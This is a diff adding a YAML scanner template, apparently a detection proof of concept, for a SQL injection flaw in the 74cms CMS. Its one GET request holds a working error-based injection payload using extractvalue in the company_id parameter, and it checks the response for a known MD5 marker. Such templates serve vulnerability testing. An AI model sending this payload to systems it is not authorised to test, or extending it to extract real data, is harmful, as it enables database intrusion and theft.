@@ -1,0 +1,21 @@
+id: poc-yaml-74cms-sqli
+info:
+  name: 74cms SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 74cms
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa")%20and%20extractvalue(1,concat(0x7e,md5(99999999)))%20--%20a
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, "ef775988943825d2871e1cfa75473ec")
+  output: []
